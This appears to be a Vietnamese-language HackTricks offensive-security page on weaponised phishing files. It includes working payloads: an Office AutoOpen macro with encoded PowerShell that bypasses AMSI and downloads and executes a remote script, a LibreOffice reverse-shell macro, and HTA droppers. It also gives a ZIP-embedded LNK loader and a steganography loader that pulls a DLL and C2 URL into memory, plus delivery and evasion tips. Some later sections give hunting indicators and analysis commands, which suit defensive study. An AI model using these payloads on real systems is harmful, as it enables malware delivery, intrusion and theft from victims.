# Tệp và tài liệu Phishing

{{#include ../../banners/hacktricks-training.md}}

## Tài liệu Office

Microsoft Word thực hiện xác thực dữ liệu tệp trước khi mở tệp. Việc xác thực dữ liệu được thực hiện bằng cách nhận diện cấu trúc dữ liệu theo tiêu chuẩn OfficeOpenXML. Nếu xảy ra lỗi trong quá trình nhận diện cấu trúc dữ liệu, tệp đang được phân tích sẽ không được mở.

Thông thường, các tệp Word chứa macro sử dụng phần mở rộng `.docm`. Tuy nhiên, bạn có thể đổi tên tệp bằng cách thay đổi phần mở rộng mà vẫn giữ khả năng thực thi macro.\
Ví dụ: tệp RTF vốn không hỗ trợ macro, nhưng tệp DOCM được đổi phần mở rộng thành RTF vẫn sẽ được Microsoft Word xử lý và có thể thực thi macro.\
Các thành phần bên trong và cơ chế tương tự cũng áp dụng cho mọi phần mềm trong bộ Microsoft Office (Excel, PowerPoint, v.v.).

Bạn có thể dùng lệnh sau để kiểm tra những phần mở rộng nào sẽ được một số chương trình Office thực thi:

```bash
assoc | findstr /i "word excel powerp"
```

Các tệp DOCX tham chiếu đến một template từ xa (File –Options –Add-ins –Manage: Templates –Go) có chứa macro cũng có thể “thực thi” macro.

### Tải ảnh bên ngoài

Đi tới: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Tài liệu Office - Tải ảnh bên ngoài: Đi tới: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Để phân tích một tài liệu đã nhận thay vì tạo tài liệu, xem [Phân tích macro VBA: mã rác và UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Cửa hậu bằng macro

Có thể dùng macro để chạy mã tùy ý từ tài liệu.

#### Hàm tự động tải

Macro càng phổ biến thì AV càng có khả năng phát hiện chúng.

- AutoOpen()
- Document_Open()

#### Ví dụ mã macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Xóa metadata thủ công

Vào **File > Info > Inspect Document > Inspect Document** để mở Document Inspector. Nhấp **Inspect**, rồi nhấp **Remove All** bên cạnh **Document Properties and Personal Information**.

#### Phần mở rộng Doc

Khi hoàn tất, chọn menu thả xuống **Save as type**, đổi định dạng từ **`.docx`** sang Word 97-2003 **`.doc`**.\
Hãy làm vậy vì bạn **không thể lưu macro trong tệp `.docx`** và phần mở rộng **`.docm`** có bật macro mang **tai tiếng** (ví dụ: biểu tượng thumbnail có dấu `!` rất lớn và một số cổng web/email chặn hoàn toàn các tệp này). Do đó, **phần mở rộng `.doc` cũ là lựa chọn dung hòa tốt nhất**.

#### Công cụ tạo macro độc hại

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro tự chạy LibreOffice ODT (Basic)

Tài liệu LibreOffice Writer có thể nhúng macro Basic và tự động thực thi khi mở tệp bằng cách liên kết macro với sự kiện **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro reverse shell đơn giản trông như sau:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Lưu ý dấu ngoặc kép kép (`""`) bên trong chuỗi – LibreOffice Basic dùng chúng để escape dấu ngoặc kép literal, vì vậy các payload kết thúc bằng `...==""")` sẽ giữ cho cả lệnh bên trong và đối số Shell cân bằng.

Mẹo gửi:

- Lưu dưới dạng `.odt` và gán macro cho sự kiện của tài liệu để macro chạy ngay khi tài liệu được mở.
- Khi gửi email bằng `swaks`, hãy dùng `--attach @resume.odt` (`@` là bắt buộc để gửi nội dung tệp, thay vì chuỗi tên tệp, dưới dạng tệp đính kèm). Điều này rất quan trọng khi khai thác các SMTP server chấp nhận tùy ý người nhận `RCPT TO` mà không xác thực.

## Tệp HTA

HTA là một chương trình Windows **kết hợp HTML và các ngôn ngữ scripting (chẳng hạn như VBScript và JScript)**. Nó tạo giao diện người dùng và chạy dưới dạng ứng dụng "được tin cậy hoàn toàn", không chịu các hạn chế trong mô hình bảo mật của trình duyệt.

HTA được thực thi bằng **`mshta.exe`**, thường được **cài đặt** cùng với **Internet Explorer**, vì vậy **`mshta` phụ thuộc vào IE**. Do đó, nếu IE đã bị gỡ cài đặt, HTA sẽ không thể chạy.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Thẻ đính kèm giả trong email HTML

Email HTML có thể mô phỏng thẻ xem trước tệp đính kèm gốc của nhà cung cấp thay vì đính kèm tệp thật. Talos đã quan sát thấy một thẻ Gmail được dựng lại từ bốn phần MIME PNG nội tuyến được mã hóa Base64. Toàn bộ thành phần hiển thị được bọc trong một anchor, và giá trị người nhận trong `?m=<target-id>` cho phép theo dõi từng người nhận. Liên kết bắt đầu bằng `//` thay vì `http://` hoặc `https://`; trình duyệt phân giải dạng URL tương đối theo giao thức này, nhưng các công cụ trích xuất URL chỉ nhận diện URL đầy đủ có thể bỏ sót nó.<sup>[[11]](#references)</sup>

Trong quá trình phân tích, hãy kiểm tra MIME thô thay vì tin vào danh sách tệp đính kèm được hiển thị. Dựng lại cách các phần hình ảnh nội tuyến tạo thành thẻ hiển thị, xác định anchor bao quanh thẻ và chuẩn hóa các giá trị `href` tương đối theo giao thức trước khi trích xuất URL.<sup>[[11]](#references)</sup>

Để kiểm tra giả mạo người gửi trong envelope/header và căn chỉnh DMARC, xem [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Buộc xác thực NTLM

Có một số cách để **buộc xác thực NTLM "từ xa"**; ví dụ, bạn có thể thêm **hình ảnh vô hình** vào email hoặc HTML mà người dùng sẽ truy cập (kể cả HTTP MitM?). Hoặc gửi cho nạn nhân **địa chỉ tệp** có thể **kích hoạt** quá trình **xác thực** chỉ bằng cách **mở thư mục**.

**Xem các ý tưởng này và nhiều ý tưởng khác trong các trang sau:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Đừng quên rằng bạn không chỉ có thể đánh cắp hash hoặc thông tin xác thực mà còn có thể **thực hiện các cuộc tấn công NTLM relay**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK dùng `ftp.exe` để thực thi lệnh cục bộ

Một shortcut có thể khởi chạy `ftp.exe -s:icon.ico` với tệp lệnh dạng văn bản được ngụy trang bằng phần mở rộng hình ảnh.<sup>[[12]](#references)</sup> Tùy chọn `-s:` đọc các lệnh FTP cục bộ; trên Windows 8 trở lên, tệp này phải được mã hóa UTF-8.<sup>[[13]](#references)</sup> Dòng bắt đầu bằng `!` chạy một lệnh cục bộ thông qua `cmd /c` mà không gửi lệnh đó đến máy chủ FTP. Đường thực thi cục bộ này không cần kết nối FTP.<sup>[[14]](#references)</sup> Trong chuỗi được báo cáo, script FTP gọi đến một tệp lệnh thứ hai. Cần chú ý toàn bộ dòng `!`: chỉ dùng `!more res.ico` sẽ hiển thị tệp, còn thêm pipe đến `cmd` sẽ thực thi nội dung của tệp.<sup>[[12]](#references)[[14]](#references)</sup>

Chuỗi này cũng dùng tác vụ định kỳ để đọc lại một tệp lệnh có thể ghi, thay vì cài một tệp thực thi mới mỗi lần cập nhật. Hành động của tác vụ là `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; tệp chứa một lệnh tải chỉ thị khi được chạy. Một biến thể liên quan tải tệp lệnh thay thế trước khi tác vụ được lên lịch chạy. Tệp phải tồn tại và đọc được khi tác vụ kích hoạt; `conhost` không nâng quyền của tác vụ vượt quá token người dùng đã cấu hình.<sup>[[12]](#references)</sup> Xem [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md) để biết cơ chế tác vụ.

## Shortcut VHDX chứa MSI ẩn và tài liệu đánh lạc hướng

VHDX được mount có thể hiển thị một LNK nhưng giấu MSI và bảng tính đánh lạc hướng trong cùng volume. Trong chuỗi được báo cáo, LNK dùng `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Dấu phân tách `&` mở tài liệu đánh lạc hướng ngay cả khi lệnh cài đặt thất bại; việc tài liệu mở ra không chứng minh rằng cài đặt thành công. Đây là biến thể phân phối của [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), chứ bản thân nó không phải là một cách leo thang đặc quyền MSI.<sup>[[12]](#references)</sup>

Với MSI này, `CustomAction.Type` **194** kết hợp EXE được lưu trong bảng `Binary` (**2**) với cờ bỏ qua mã trả về (**64**) và chạy bất đồng bộ (**128**). Tổ hợp **64 + 128** có nghĩa là Windows Installer không chờ EXE hoàn tất; riêng cờ 128 sẽ khiến hệ thống chờ đến cuối chuỗi mới tiếp tục.<sup>[[15]](#references)[[16]](#references)</sup> Trước khi quy việc thực thi cho EXE nhúng đó, hãy kiểm tra `Source` của action với bảng `Binary` và vị trí của nó trong `InstallExecuteSequence`.<sup>[[12]](#references)[[15]](#references)</sup> [Đường dẫn UNC WebDAV có thể phân phối MSI từ xa](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), nhưng đó là một điểm xâm nhập khác.

## LNK Loader + Payload nhúng trong ZIP (chuỗi fileless)

Các chiến dịch có hiệu quả cao phân phối một ZIP chứa hai tài liệu đánh lạc hướng hợp lệ (PDF/DOCX) và một tệp .lnk độc hại. Thủ thuật là PowerShell loader thực tế được lưu bên trong byte thô của ZIP, phía sau một marker duy nhất; LNK trích xuất và chạy payload hoàn toàn trong bộ nhớ.<sup>[[2]](#references)</sup>

Quy trình điển hình do lệnh PowerShell một dòng trong .lnk thực hiện:

1) Tìm ZIP gốc trong các đường dẫn phổ biến: Desktop, Downloads, Documents, %TEMP%, %ProgramData% và thư mục cha của thư mục làm việc hiện tại.
2) Đọc byte của ZIP và tìm marker được hardcode (ví dụ: xFIQCV). Mọi dữ liệu phía sau marker là PowerShell payload được nhúng.
3) Sao chép ZIP vào %ProgramData%, giải nén tại đó và mở tệp .docx đánh lạc hướng để trông như hợp lệ.
4) Bypass AMSI cho tiến trình hiện tại: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate stage tiếp theo (ví dụ: xóa tất cả ký tự #) và thực thi trong bộ nhớ.

Ví dụ khung PowerShell để trích xuất và chạy stage được nhúng:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Ghi chú
- Việc phát tán thường lợi dụng các subdomain PaaS uy tín (ví dụ: *.herokuapp.com) và có thể giới hạn việc phân phối payload (phân phát ZIP lành tính dựa trên IP/UA).
- Giai đoạn tiếp theo thường giải mã shellcode base64/XOR và thực thi bằng Reflection.Emit + VirtualAlloc để giảm thiểu dấu vết trên ổ đĩa.

Persistence được sử dụng trong cùng chuỗi
- COM TypeLib hijacking của điều khiển Microsoft Web Browser, khiến IE/Explorer hoặc bất kỳ ứng dụng nào nhúng điều khiển này tự động khởi chạy lại payload.<sup>[[2]](#references)[[4]](#references)</sup> Xem chi tiết và các lệnh có thể dùng ngay tại đây:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Truy tìm/IOCs
- Các tệp ZIP có chứa chuỗi ký hiệu ASCII (ví dụ: xFIQCV) được nối vào dữ liệu archive.
- Tệp .lnk liệt kê các thư mục cha/thư mục người dùng để tìm tệp ZIP rồi mở tài liệu mồi.
- AMSI bị can thiệp thông qua [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Các chuỗi email công việc kéo dài, kết thúc bằng các liên kết được lưu trữ trên những domain PaaS đáng tin cậy.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Một mẫu khác thường gặp là **tệp `.lnk` giả dạng tài liệu**, lập tức mở mồi nhử lành tính trong khi âm thầm triển khai chuỗi thực sự ở chế độ nền.<sup>[[3]](#references)</sup>

Quy trình được quan sát:
1. Shortcut **giả dạng PDF** và dùng `conhost.exe` hoặc một proxy tương tự để chạy trình tải xuống PowerShell đã làm rối.
2. PowerShell chia tách các token dễ nhận biết (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) để các cơ chế phát hiện đơn giản tìm kiếm `iwr`, `gci`, `ren`, `cpi` hoặc `schtasks` không nhận ra lệnh.
3. Stager tải **tài liệu mồi trước**, mở tài liệu đó cho nạn nhân, rồi tái tạo các tệp độc hại ở chế độ nền.
4. Payload có thể được ghi ra với **phần mở rộng rác**, sau đó đổi tên bằng cách loại bỏ các ký tự chèn thêm, làm chậm thời điểm xuất hiện các artifact `.exe` / `.cpl` dễ nhận biết.
5. Persistence được thiết lập bằng một **scheduled task chạy theo phút**, khởi chạy binary host đáng tin cậy từ một đường dẫn mà người dùng có thể ghi.

Các dấu hiệu truy tìm tối thiểu từ mẫu này:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Một bố cục staging hữu ích cần nhận biết:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` hoặc `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Vì sao stage thứ hai khó bị phát hiện

Trong case study của Rapid7, scheduled task liên tục khởi chạy **`Fondue.exe`** từ `C:\Users\Public\`. Vì **`APPWIZ.cpl`** được đặt cùng thư mục và export **`RunFODW`**, binary đáng tin cậy của Microsoft đã side-load CPL của attacker thay vì bản hệ thống hợp lệ.

CPL sau đó:
- Đọc blob **AES-256-CBC** từ `C:\Windows\Tasks\editor.dat`
- Giải mã blob qua **Windows CNG / `bcrypt.dll`**
- Cấp phát bộ nhớ có quyền thực thi và sao chép shellcode đã giải mã vào đó
- Thực thi gián tiếp bằng cách truyền con trỏ shellcode làm callback cho **`EnumUILanguagesW`**

Bước cuối này đáng được săn tìm riêng: malware thường tránh nhảy trực tiếp bằng `((void(*)())buf)()` mà thay vào đó lạm dụng **WinAPI hợp lệ có nhận callback** để chuyển luồng thực thi.

Payload được giải mã trong chiến dịch này là shellcode **Donut**. Sau đó, nó ánh xạ PE cuối cùng hoàn toàn vào bộ nhớ và vá **AMSI/WLDP/ETW** trong process hiện tại trước khi chuyển giao quyền thực thi. Để tìm hiểu sâu hơn về side-loading và xử lý hậu kỳ trong bộ nhớ, xem:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Các điểm thực tiễn để săn tìm:
- `.lnk` khởi chạy `powershell.exe` hoặc `conhost.exe`, sau đó hiển thị một tài liệu mồi.
- Các lượt tải xuống tồn tại trong thời gian ngắn vào **`C:\Users\Public\`**, sau đó được đổi tên ngay từ các phần mở rộng vô nghĩa.
- Scheduled task có tên chung chung như `GoogleErrorReport`, thực thi từ **thư mục người dùng có quyền ghi**.
- Binary đáng tin cậy tải các file **`.cpl` / `.dll`** từ cùng một thư mục không thuộc hệ thống.
- Các blob văn bản Base64 được ghi vào **`C:\Windows\Tasks\`**, rồi được module side-load đọc.

## Payload được phân tách bằng dấu mốc steganography trong ảnh (PowerShell stager)

Các chuỗi loader gần đây phân phối JavaScript/VBS đã làm rối, có chức năng giải mã và chạy PowerShell stager dạng Base64. Stager này tải xuống một ảnh (thường là GIF) chứa một .NET DLL được mã hóa Base64 và ẩn dưới dạng văn bản thuần giữa các dấu mốc bắt đầu/kết thúc riêng biệt. Script tìm các dấu phân cách này (ví dụ được ghi nhận ngoài thực tế: «<<sudo_png>> … <<sudo_odt>>>»), trích xuất phần văn bản ở giữa, giải mã Base64 thành bytes, nạp assembly vào bộ nhớ và gọi một entry method đã biết cùng URL C2.<sup>[[5]](#references)</sup>

Quy trình
- Stage 1: JS/VBS dropper dạng archive → giải mã Base64 nhúng sẵn → khởi chạy PowerShell stager với -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → tải ảnh xuống, trích xuất Base64 nằm giữa các dấu mốc, nạp .NET DLL vào bộ nhớ và gọi method của nó (ví dụ: VAI), truyền URL C2 cùng các tùy chọn.
- Stage 3: Loader lấy payload cuối cùng và thường inject payload đó qua process hollowing vào một binary đáng tin cậy (thường là MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tìm hiểu thêm về process hollowing và việc thực thi proxy qua tiện ích đáng tin cậy tại đây:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ví dụ PowerShell trích xuất DLL từ ảnh và gọi một .NET method trong bộ nhớ:

<details>
<summary>Trình trích xuất và loader payload steganography bằng PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Ghi chú
- Đây là ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Các marker khác nhau tùy chiến dịch.
- AMSI/ETW bypass và giải obfuscation chuỗi thường được thực hiện trước khi tải assembly.
- Threat hunting: quét ảnh đã tải xuống để tìm delimiter đã biết; xác định PowerShell truy cập ảnh và giải mã ngay các blob Base64.

Xem thêm công cụ stego và kỹ thuật carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging PowerShell bằng Base64

Một initial stage thường gặp là tệp `.js` hoặc `.vbs` nhỏ, bị obfuscation nặng và được phát tán bên trong archive. Mục đích duy nhất của nó là giải mã chuỗi Base64 nhúng bên trong rồi khởi chạy PowerShell với `-nop -w hidden -ep bypass` để bootstrap stage tiếp theo qua HTTPS.<sup>[[5]](#references)</sup>

Logic khung (trừu tượng):
- Đọc nội dung tệp của chính nó
- Tìm blob Base64 nằm giữa các chuỗi rác
- Giải mã thành PowerShell ASCII
- Thực thi bằng `wscript.exe`/`cscript.exe` gọi `powershell.exe`

Dấu hiệu threat hunting
- Tệp đính kèm JS/VBS trong archive khởi chạy `powershell.exe` với `-enc`/`FromBase64String` trong command line.
- `wscript.exe` khởi chạy `powershell.exe -nop -w hidden` từ các đường dẫn temp của người dùng.

## Tài liệu MSC làm container thực thi (GrimResource)

Tệp Microsoft Management Console (`.msc`) là các định nghĩa console dạng XML thường được mở bằng `mmc.exe`. **GrimResource** vũ khí hóa tham chiếu `StringTable` đến resource `apds.dll` có chứa một XSS primitive cũ, khiến JavaScript chạy bên trong `mmc.exe` khi người dùng mở console được tạo thủ công. Các mẫu được quan sát kết hợp obfuscation dựa trên `transformNode` với **DotNetToJScript** để khởi tạo payload .NET mà không đi theo con đường macro Office thông thường.<sup>[[9]](#references)</sup>

Để phân tích tĩnh, hãy xem MSC không đáng tin cậy như văn bản và **không** nhấp đúp vào tệp:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Các dấu hiệu chuyển hướng runtime có giá trị cao gồm `mmc.exe` tải CLR hoặc các thành phần script, tạo kết nối mạng, hoặc khởi chạy `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` hay một executable bất thường. Định dạng này hợp lệ, vì vậy các phát hiện nên tương quan **nguồn gốc + nội dung XML/script đáng ngờ + hành vi của `mmc.exe`** thay vì chặn mọi MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirectors và payload gating

PDF không cần exploit để hữu ích. Các chiến dịch gần đây đặt **mã QR hoặc liên kết thông thường** trong tài liệu trông có vẻ vô hại, chuyển phiên trình duyệt ra khỏi các biện pháp kiểm soát email và cá nhân hóa đích đến bằng địa chỉ người nhận. Microsoft đã ghi nhận các PDF năm 2025 có URL QR riêng cho từng người nhận và dẫn đến hạ tầng thu thập thông tin xác thực RaccoonO365; một chuỗi tấn công song song dùng cơ chế gating theo IP/môi trường để trả về đường dẫn JavaScript/MSI cho một số khách truy cập được chọn, nhưng trả về PDF vô hại cho các scanner hoặc client không được phép.<sup>[[10]](#references)</sup>

Hãy phân loại cả các hành động PDF lẫn mã QR được render. Mã QR có thể được vẽ dưới dạng vector thay vì lưu thành hình ảnh có thể trích xuất, vì vậy hãy rasterize mọi trang đồng thời trích xuất các hình ảnh được nhúng:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kiểm tra các đích đến đã giải mã và chuỗi redirect từ một hệ thống phân tích cô lập, không xác thực. Các dấu hiệu hữu ích để săn tìm gồm PDF chỉ chứa QR với phần nội dung email gần như trống, email người nhận được nhúng trong query parameter, nhiều redirect đi qua các dịch vụ hosting uy tín và nội dung khác nhau được trả về tùy theo IP, vị trí địa lý, cookie, referrer hoặc user agent. So sánh các request bằng những profile được kiểm soát, vì một lần sandbox fetch duy nhất có thể chỉ nhận được nội dung đánh lạc hướng.<sup>[[10]](#references)</sup>

## Các tệp Windows dùng để đánh cắp NTLM hash

Xem trang về **các vị trí có thể đánh cắp NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công phishing tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Theo dõi tradecraft của Dropping Elephant qua chuỗi loader chủ đề Trung Quốc](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Kỹ thuật persistence COM mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Loader PhantomVAI phát tán nhiều loại infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console dùng cho initial access và evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tác nhân đe dọa lợi dụng mùa khai thuế để triển khai các chiến dịch phishing theo chủ đề thuế](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Chuỗi phát tán UAT-11587 và backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER mở rộng kho vũ khí với PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - Lệnh ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Tùy chọn xử lý giá trị trả về của Custom Action](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
